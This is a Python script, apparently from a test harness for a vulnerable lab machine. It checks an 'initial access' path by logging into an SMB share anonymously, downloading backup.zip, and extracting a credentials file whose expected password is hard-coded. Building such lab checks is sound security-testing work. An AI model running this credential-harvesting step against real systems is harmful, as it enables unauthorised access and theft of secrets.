from smb.SMBConnection import SMBConnection
from core.test_structs import AttackResult

# initial access measure #1 
# download file from share
# unzip file
# check for presence of specific file and its contents
def solaris_smb_initial_access(target_ip: str) -> AttackResult:

    share_name = "public"
    zip_file = "backup.zip"
    target_file = "credentials.txt"
    content = "solar-paneL321"
    try:
        conn = SMBConnection("", "", "local_machine", "remote_machine")
        connected = conn.connect(target_ip, 139)

        if not connected:
            return AttackResult(success=False, message="Could not connect to the SMB server.")

        # Download the zip file
        from utils.file_share_utils import download_smb_file
        zip_content = download_smb_file(conn, share_name, f"/{zip_file}")

        # Unzip the file in memory
        import zipfile
        from io import BytesIO

        zip_file_obj = BytesIO(zip_content)
        with zipfile.ZipFile(zip_file_obj) as z:
            if target_file in z.namelist():
                with z.open(target_file) as f:
                    file_content = f.read().decode()
                    if content in file_content:
                        return AttackResult(success=True, message=f"Found credentials in {target_file}: {file_content}", data=file_content)
                    else:
                        return AttackResult(success=False, message=f"{target_file} does not contain expected credentials.")
            else:
                return AttackResult(success=False, message=f"{target_file} not found in the zip archive.")
    except Exception as e:
        return AttackResult(success=False, message=str(e))